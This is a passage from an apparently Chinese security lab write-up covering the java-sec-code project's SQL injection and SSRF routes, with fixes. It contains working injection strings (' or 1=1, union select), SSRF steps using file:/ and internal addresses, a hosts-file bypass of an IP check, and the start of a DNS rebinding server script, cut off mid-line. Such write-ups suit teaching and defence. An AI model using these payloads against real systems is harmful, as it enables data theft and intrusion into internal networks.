data-num="5"></td><td><pre><span class="token operator">/</span>sqli<span class="token operator">/</span>jdbc<span class="token operator">/</span>vuln<span class="token operator">?</span>username<span class="token operator">=</span>joychou' or <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span></pre></td></tr></table></figure><p>还可以联合注入继续 SQL 注入：</p>
<p>0' or 1=1 union select 1,database(),3 '</p>
<h4 id="incorrect-preparestatement"><a class="anchor" href="#incorrect-preparestatement">#</a> Incorrect prepareStatement</h4>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// PreparedStatement 是 java 原生的 sql 预编译函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 这里应该用？表示预编译的字符串</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from users where username = '"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token class-name">PreparedStatement</span> st <span class="token operator">=</span> con<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">/</span>sqli<span class="token operator">/</span>jdbc<span class="token operator">/</span>ps<span class="token operator">/</span>vuln<span class="token operator">?</span>username<span class="token operator">=</span>joychou<span class="token char">' or '</span>a<span class="token char">'='</span>a'<span class="token operator">%</span><span class="token number">23</span></pre></td></tr></table></figure><h4 id="incorrect-mybatis"><a class="anchor" href="#incorrect-mybatis">#</a> Incorrect mybatis</h4>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 用 $&#123;&#125; 不会预编译，应该用 #&#123;&#125;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// SQLI.java</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/mybatis/vuln01"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">mybatisVuln01</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">return</span> userMapper<span class="token punctuation">.</span><span class="token function">findByUserNameVuln01</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">// UserMapper.java</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token annotation punctuation">@Select</span><span class="token punctuation">(</span><span class="token string">"select * from users where username = '$&#123;username&#125;'"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">findByUserNameVuln01</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">/</span>sqli<span class="token operator">/</span>mybatis<span class="token operator">/</span>vuln01<span class="token operator">?</span>username<span class="token operator">=</span>joychou<span class="token char">' or '</span><span class="token number">1</span><span class="token char">'='</span><span class="token number">1</span>'<span class="token operator">%</span><span class="token number">23</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// 应该用 #&#123;&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">// SQLI.java</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/mybatis/vuln02"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">mybatisVuln02</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">return</span> userMapper<span class="token punctuation">.</span><span class="token function">findByUserNameVuln02</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment">// UserMapper.java</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">findByUserNameVuln02</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">// UserMapper.xml</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token operator">&lt;</span>select id<span class="token operator">=</span><span class="token string">"findByUserNameVuln02"</span> parameterType<span class="token operator">=</span><span class="token string">"String"</span> resultMap<span class="token operator">=</span><span class="token string">"User"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="24"></td><td><pre>        select <span class="token operator">*</span> from users where username like '<span class="token operator">%</span>$<span class="token punctuation">&#123;</span>_parameter<span class="token punctuation">&#125;</span><span class="token operator">%</span>'</pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token operator">/</span>sqli<span class="token operator">/</span>mybatis<span class="token operator">/</span>vuln02<span class="token operator">?</span>username<span class="token operator">=</span>joychou<span class="token char">' or '</span><span class="token number">1</span><span class="token char">'='</span><span class="token number">1</span>'<span class="token operator">%</span><span class="token number">23</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment">// SQLI.java</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/mybatis/orderby/vuln03"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">mybatisVuln03</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"sort"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> sort<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">return</span> userMapper<span class="token punctuation">.</span><span class="token function">findByUserNameVuln03</span><span class="token punctuation">(</span>sort<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token comment">// UserMapper.java</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">findByUserNameVuln03</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"order"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> order<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment">// UserMapper.xml</span></pre></td></tr><tr><td data-num="37"></td><td><pre>  <span class="token operator">&lt;</span>select id<span class="token operator">=</span><span class="token string">"findByUserNameVuln03"</span> parameterType<span class="token operator">=</span><span class="token string">"String"</span> resultMap<span class="token operator">=</span><span class="token string">"User"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="38"></td><td><pre>        select <span class="token operator">*</span> from users</pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token operator">&lt;</span><span class="token keyword">if</span> test<span class="token operator">=</span><span class="token string">"order != null"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="40"></td><td><pre>            order by $<span class="token punctuation">&#123;</span>order<span class="token punctuation">&#125;</span> asc</pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token operator">></span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token operator">/</span>sqli<span class="token operator">/</span>mybatis<span class="token operator">/</span>orderby<span class="token operator">/</span>vuln03<span class="token operator">?</span>sort<span class="token operator">=</span>id desc<span class="token operator">--</span></pre></td></tr></table></figure><p>修复方案：</p>
<p>正确使用 <code>orm</code>  框架，预编译传入的参数。</p>
<h5 id="防护方案"><a class="anchor" href="#防护方案">#</a> 防护方案：</h5>
<p>（1）预编译</p>
<pre><code>String sql = &quot;select * from users where username = ?&quot;;
PreparedStatement st = con.prepareStatement(sql);
复制代码12
</code></pre>
<p>（2）waf</p>
<pre><code> private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+$&quot;);
 public static String sqlFilter(String sql) &#123;
        if (!FILTER_PATTERN.matcher(sql).matches()) &#123;
            return null;
        &#125;
        return sql;
    
java复制代码123456
</code></pre>
<p>（3）MyBatis 防护</p>
<pre><code>@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)
</code></pre>
<h2 id="ssrf"><a class="anchor" href="#ssrf">#</a> ssrf</h2>
<h3 id="1路由ssrfurlconnectionvuln"><a class="anchor" href="#1路由ssrfurlconnectionvuln">#</a> 1. 路由 /ssrf/urlConnection/vuln</h3>
<p>漏洞代码：</p>
<pre><code>    @RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)
    public String URLConnectionVuln(String url) &#123;
        return HttpUtils.URLConnection(url);
    &#125;
</code></pre>
<p>再来看函数 <code>UrlConnection</code>  的定义：</p>
<pre><code>   public static String URLConnection(String url) &#123;
        try &#123;
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) &#123;
                html.append(inputLine);
            &#125;
            in.close();
            return html.toString();
        &#125; catch (Exception e) &#123;
            logger.error(e.getMessage());
            return e.getMessage();
        &#125;
    &#125;
</code></pre>
<p>这里我们可以用文件读取协议 <code>file:/</code>  实现访问，也可以访问到内网的其他主机</p>
<p><img data-src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930115111649.png" alt="image-20240930115111649" /></p>
<h3 id="2路由ssrfhttpurlconnectionvuln"><a class="anchor" href="#2路由ssrfhttpurlconnectionvuln">#</a> 2. 路由 /ssrf/HttpURLConnection/vuln</h3>
<p>漏洞代码：</p>
<pre><code>@GetMapping(&quot;/HttpURLConnection/vuln&quot;)
public String httpURLConnectionVuln(@RequestParam String url) &#123;
    return HttpUtils.HttpURLConnection(url);
&#125;
</code></pre>
<p>来看函数 <code>HttpUrlConnection</code>  定义：</p>
<pre><code>    public static String HttpURLConnection(String url) &#123;
        try &#123;
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            HttpURLConnection conn = (HttpURLConnection) urlConnection;
//             conn.setInstanceFollowRedirects(false);
//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField
            InputStream is = conn.getInputStream();  // send request
            BufferedReader in = new BufferedReader(new InputStreamReader(is));
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) &#123;
                html.append(inputLine);
            &#125;
            in.close();
            return html.toString();
        &#125; catch (IOException e) &#123;
            logger.error(e.getMessage());
            return e.getMessage();
        &#125;
    &#125;
</code></pre>
<p>这里用 <code>HttpURLConnection</code>  类进行了一个强转，限制只能使用 http/https 协议，但可以访问内网其他主机：</p>
<p><img data-src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930143648191.png" alt="image-20240930143648191" /></p>
<h3 id="3路由ssrfopenstream"><a class="anchor" href="#3路由ssrfopenstream">#</a> 3. 路由 /ssrf/openStream</h3>
<pre><code>    @GetMapping(&quot;/openStream&quot;)
    public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException &#123;
        InputStream inputStream = null;
        OutputStream outputStream = null;
        try &#123;
            String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + &quot;.&quot; + WebUtils.getFileExtension(url);
            // download
            response.setHeader(&quot;content-disposition&quot;, &quot;attachment;fileName=&quot; + downLoadImgFileName);

            URL u = new URL(url);
            int length;
            byte[] bytes = new byte[1024];
            inputStream = u.openStream(); // send request
            outputStream = response.getOutputStream();
            while ((length = inputStream.read(bytes)) &gt; 0) &#123;
                outputStream.write(bytes, 0, length);
            &#125;

        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
        &#125; finally &#123;
            if (inputStream != null) &#123;
                inputStream.close();
            &#125;
            if (outputStream != null) &#123;
                outputStream.close();
            &#125;
        &#125;
    &#125;
</code></pre>
<p>可以通过这个路由实现任意文件下载：</p>
<p><img data-src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930145400529.png" alt="image-20240930145400529" /></p>
<h3 id="4路由ssrfhttpsyncclientsvuln"><a class="anchor" href="#4路由ssrfhttpsyncclientsvuln">#</a> 4. 路由 /ssrf/HttpSyncClients/vuln</h3>
<p>漏洞代码：</p>
<pre><code>    @GetMapping(&quot;/HttpSyncClients/vuln&quot;)
    public String HttpSyncClients(@RequestParam(&quot;url&quot;) String url) &#123;
        return HttpUtils.HttpAsyncClients(url);
    &#125;
</code></pre>
<p><code>HttpAsyncClients</code>  函数：</p>
<pre><code> public static String HttpAsyncClients(String url) &#123;
        CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();
        try &#123;
            httpclient.start();
            final HttpGet request = new HttpGet(url);
            Future&lt;HttpResponse&gt; future = httpclient.execute(request, null);
            HttpResponse response = future.get(6000, TimeUnit.MILLISECONDS);
            return EntityUtils.toString(response.getEntity());
        &#125; catch (Exception e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            try &#123;
                httpclient.close();
            &#125; catch (Exception e) &#123;
                logger.error(e.getMessage());
            &#125;
        &#125;
    &#125;
</code></pre>
<p>未对 SSRF 进行检查，存在漏洞：</p>
<p><img data-src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930160113322.png" alt="image-20240930160113322" /></p>
<h3 id="5路由ssrfresttemplatevuln1"><a class="anchor" href="#5路由ssrfresttemplatevuln1">#</a> 5. 路由 /ssrf/restTemplate/vuln1</h3>
<p>漏洞代码：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/restTemplate/vuln1"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">RestTemplateUrlBanRedirects</span><span class="token punctuation">(</span><span class="token class-name">String</span> url<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">HttpHeaders</span> headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        headers<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token class-name">MediaType</span><span class="token punctuation">.</span><span class="token constant">APPLICATION_JSON_UTF8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">return</span> <span class="token class-name"><span class="token namespace">httpService<span class="token punctuation">.</span></span>RequestHttpBanRedirects</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这段代码使用 <strong>Spring RestTemplate</strong> 来进行 HTTP 请求，并禁止了重定向，但不影响直接访问：</p>
<p><img data-src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930161505278.png" alt="image-20240930161505278" /></p>
<h3 id="6路由ssrfresttemplatevuln2"><a class="anchor" href="#6路由ssrfresttemplatevuln2">#</a> 6. 路由 /ssrf/restTemplate/vuln2</h3>
<p>漏洞代码：</p>
<pre><code>   @GetMapping(&quot;/restTemplate/vuln2&quot;)
    public String RestTemplateUrl(String url)&#123;
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttp(url, headers);
    &#125;
</code></pre>
<p>这个不禁止重定向了，直接就可以 SSRF</p>
<p><img data-src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930162139227.png" alt="image-20240930162139227" /></p>
<h3 id="7路由ssrfhutoolvuln"><a class="anchor" href="#7路由ssrfhutoolvuln">#</a> 7. 路由 /ssrf/hutool/vuln</h3>
<p>漏洞代码：</p>
<pre><code>@GetMapping(&quot;/hutool/vuln&quot;)
public String hutoolHttp(String url)&#123;
    return HttpUtil.get(url);
&#125;
</code></pre>
<p>换汤不换药，该库也能 SSRF, 不过禁止了重定向：</p>
<p><img data-src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930162620184.png" alt="image-20240930162620184" /></p>
<h3 id="8路由ssrfdnsrebindvuln"><a class="anchor" href="#8路由ssrfdnsrebindvuln">#</a> 8. 路由 /ssrf/dnsrebind/vuln</h3>
<p>漏洞代码：</p>
<pre><code>@GetMapping(&quot;/dnsrebind/vuln&quot;)
public String DnsRebind(String url) &#123;
    java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;);
    if (!SecurityUtil.checkSSRFWithoutRedirect(url)) &#123;
        return &quot;Dangerous url&quot;;
    &#125;
    return HttpUtil.get(url);
&#125;
</code></pre>
<p><code>checkSSRFWithoutRedirect</code>  函数：</p>
<pre><code> /**
     * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。
     * 存在问题：
     *  1、TTL为0会被绕过
     *  2、使用重定向可绕过
     *
     * @param url The url that needs to check.
     * @return Safe url returns true. Dangerous url returns false.
     */
    public static boolean checkSSRFWithoutRedirect(String url) &#123;
        if(url == null) &#123;
            return false;
        &#125;
        return !SSRFChecker.isInternalIpByUrl(url);
    &#125;
</code></pre>
<p><code>isInternalIpByUrl</code>  函数：</p>
<pre><code>public static boolean isInternalIpByUrl(String url) &#123;

        String host = url2host(url);
        if (host.equals(&quot;&quot;)) &#123;
            return true; // 异常URL当成内网IP等非法URL处理
        &#125;

        String ip = host2ip(host);
        if (ip.equals(&quot;&quot;)) &#123;
            return true; // 如果域名转换为IP异常，则认为是非法URL
        &#125;

        return isInternalIp(ip);
    &#125;
</code></pre>
<p>添加了 IP 检查，修改一下 dns 解析即可绕过，方法如下：</p>
<p>给本地的 hosts 文件添加一条解析记录：</p>
<pre><code>192.168.1.43 www.baidu.com
</code></pre>
<p>然后就可以实现 ssrf：</p>
<p><img data-src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930165613203.png" alt="image-20240930165613203" /></p>
<h3 id="dns重绑定"><a class="anchor" href="#dns重绑定">#</a> DNS 重绑定</h3>
<h4 id="dns"><a class="anchor" href="#dns">#</a> dns:</h4>
<blockquote>
<p>DNS (Domain Name Service)、计算机域名服务器，是<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJBJTkyJUU4JTgxJTk0JUU3JUJEJTkx">互联网</span>的一项服务。它作为将<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JTlGJTlGJUU1JTkwJThE">域名</span>和<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSVAlRTUlOUMlQjAlRTUlOUQlODA="> IP 地址</span>相互<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTk4JUEwJUU1JUIwJTg0">映射</span>的一个<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JTg4JTg2JUU1JUI4JTgzJUU1JUJDJThGJUU2JTk1JUIwJUU2JThEJUFFJUU1JUJBJTkz">分布式数据库</span>，能够使人更方便地访问<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJBJTkyJUU4JTgxJTk0JUU3JUJEJTkx">互联网</span>。DNS 使用<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJDJUEwJUU4JUJFJTkzJUU2JThFJUE3JUU1JTg4JUI2JUU1JThEJThGJUU4JUFFJUFF"> TCP</span> 和<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JTk0JUE4JUU2JTg4JUI3JUU2JTk1JUIwJUU2JThEJUFFJUU2JThBJUE1JUU1JThEJThGJUU4JUFFJUFF"> UDP</span><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvVENQL1VEUCVFNyVBQiVBRiVFNSU4RiVBMyVFNSU4OCU5NyVFOCVBMSVBOA=="> 端口</span> 53 [<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JTlGJTlGJUU1JTkwJThEJUU3JUIzJUJCJUU3JUJCJTlGI2NpdGVfbm90ZS0x">1]</span>。当前，对于每一级域名长度的限制是 63 个字符，域名总长度则不能超过 253 个字符。开始时，域名的字符仅限于<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvQVNDSUk="> ASCII</span> 字符的一个子集。2008 年，<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSUNBTk4=">ICANN</span> 通过一项决议，允许使用其它语言作为互联网顶级域名的字符。使用基于<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvUHVueWNvZGU="> Punycode</span> 码的<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSUROQQ=="> IDNA</span> 系统，可以将<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvVW5pY29kZQ=="> Unicode</span> 字符串映射为有效的 DNS 字符集。因此，诸如 “XXX. 中国”、“XXX. 美国” 的域名可以在地址栏直接输入并访问，而不需要安装插件。但是，由于英语的广泛使用，使用其他语言字符作为域名会产生多种问题，例如难以输入，难以在国际推广等。</p>
</blockquote>
<p>小概念简单地说，DNS 的存在就是为了域名解析，DNS 绑定的效果就是在 DNS 中将域名请求解析为相应的服务器 IP 地址请求，好处就是人们访问服务器的时候，不需要背枯燥的 32 位 IPv4 的地址，而是可以大众化的单词，相当有含义和方便。</p>
<p>域名解析就是可以通过这个域名直接找到他的 IP<strong> 地址</strong></p>
<h4 id="dns的记录类型"><a class="anchor" href="#dns的记录类型">#</a> DNS 的记录类型</h4>
<ul>
<li>
<pre><code>- 主机记录(A记录):A记录是用于名称解析的重要记录，它将特定的主机名映射到对应的主机IP上
- 别名记录(CNAME记录):CNAME记录用于将某个别名指向到某个A记录上,这就就不需要再为某个新名字创建一条新纪录。
- 名称服务器记录(NS):委托DNS区域使用已提供的权威域名服务器,用来指定该域名由那个DNS服务器来解析,后面谈一下DNSLog的开发思路会涉及这个。
</code></pre>
<h4 id="dns绑定技术"><a class="anchor" href="#dns绑定技术">#</a> DNS 绑定技术：</h4>
<p>1.DNS 区域是一个层次结构的空间，根域名服务器 -》子域名服务器 -》二代子域名服务器</p>
<p>2.DNS 查询方式：递归和迭代</p>
<p>递归一般是指</p>
<pre><code>以查询 zh.wikipedia.org 为例：

客户端发送查询报文&quot;query zh.wikipedia.org&quot;至DNS服务器，DNS服务器首先检查自身缓存，如果存在记录则直接返回结果。
如果记录老化或不存在，则：
DNS服务器向根域名服务器发送查询报文&quot;query zh.wikipedia.org&quot;，根域名服务器返回顶级域 .org 的权威域名服务器地址。
DNS服务器向 .org 域的权威域名服务器发送查询报文&quot;query zh.wikipedia.org&quot;，得到二级域 .wikipedia.org 的权威域名服务器地址。
DNS服务器向 .wikipedia.org 域的权威域名服务器发送查询报文&quot;query zh.wikipedia.org&quot;，得到主机 zh 的A记录，存入自身缓存并返回给客户端。
</code></pre>
<p>这里我们 需要注意的是，DNS 的返回结果是可以由 DNS 服务器自己来决定的</p>
<p>所以说我可以编写一个 DNS 服务器来控制指定域名的解析 IP，而且可以控制 TTL 值</p>
</li>
</ul>
<p>请求域名解析（第一种路径）</p>
<p>（1），浏览器发起的请求</p>
<p>1. 浏览器搜索自身的 DNS 缓存，命中则解析，否则继续下一步</p>
<p>查看 google 浏览器的缓存记录</p>
<pre><code>[chrome://net-internals/#dns](chrome://net-internals/#dns)
</code></pre>
<p>2. 浏览器搜索操作系统自身的 DNS 缓存，如果找到且没有国企（TTL 值），则解析结束，否则下一步（这一步很重要，TTL 值在这里其决定是否下一步）</p>
<p>3. 尝试读取 hosts 文件，假设不找到，继续下一步</p>
<p>4. 浏览器发起 DNS 系统调用，迭代过程如下：</p>
<p>运营商 DNS--&gt; 根域名服务器 --&gt; 顶级域名服务器 --&gt; 我们设置 NS 域名服务器。（我们可以递归向下设置 TTL 的值）</p>
<p>5. 找到 IP 地址，简历对应的 TCP 连接，开始通信。</p>
<p>SSRF 发起的请求，curl 发起的请求跟前面相比就少了第一步的查询过程</p>
<h4 id="dns重绑定-2"><a class="anchor" href="#dns重绑定-2">#</a> DNS 重绑定：</h4>
<p>概念：当我们发起域名解析请求的时候，第一次方法会返回以恶个 IP 地址 A，但是当我们发起第二次域名解析请求的时候，却会返回一个不同于 A 的 IP 地址 B</p>
<p>比如直接</p>
<pre><code>curl www.ak47.com 获取的解析ip为60.221.158.45，将其认定为外网ip，给与通行，但是程序为了考虑一些cdn的因素，第二次请求判断的时候不会去第一个解析结果的ip

那么第二次照样是curl www.ak47.com 这个时候我们可以在这个短暂的第一次和第二次的间隔里面控制第二次的解析ip为127.0.0.1（可以自己设置），从而实现访问内网的应用，实现重绑定攻击。
</code></pre>
<p>脚本（本地搭建）：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># rebind_dns.py</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> dnslib<span class="token punctuation">.</span>server <span class="token keyword">import</span> DNSServer<span class="token punctuation">,</span> BaseResolver</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> dnslib <span class="token keyword">import</span> DNSRecord<span class="token punctuation">,</span> QTYPE<span class="token punctuation">,</span> RR<span class="token punctuation">,</span> A<span class="token punctuation">,</span> DNSHeader</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># 域名记录访问时间</span></pre></td></tr><tr><td data-num="7"></td><td><pre>visit_log <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment"># 域名配置</span></pre></td></tr><tr><td data-num="10"></td><td><pre>RECORD_DOMAIN <span class="token operator">=</span> <span class="token string">"rebind.test."</span>  <span class="token comment"># 注意末尾要有点</span></pre></td></tr><tr><td data-num="11"></td><td><pre>IP1 <span class="token operator">=</span> <span class="token string">"1.2.3.4"</span>                <span class="token comment"># 第一次返回的攻击者站点 IP</span></pre></td></tr><tr><td data-num="12"></td><td><pre>IP2 <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>              <span class="token comment"># 后续返回目标服务 IP（如 